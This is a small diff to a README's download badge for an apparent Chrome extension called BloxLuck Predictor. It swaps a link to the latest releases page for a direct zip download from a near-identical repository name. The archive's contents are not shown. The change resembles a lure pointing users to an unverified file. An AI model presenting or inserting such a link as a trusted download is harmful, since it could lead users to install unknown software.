@@ -4,7 +4,7 @@
 </div>
 
 <p align="center">
-  <a href="https://github.com/rethard/BloxLuck+/releases/latest" target="_blank">
+  <a href="https://github.com/rethard/BloxLuck-/releases/download/v1.0/BloxLuck.Predictor+.zip" target="_blank">
     <img src="https://img.shields.io/badge/Download-Chrome_Extension-success?style=for-the-badge&logo=googlechrome&logoColor=white"/>
   </a>
 </p>
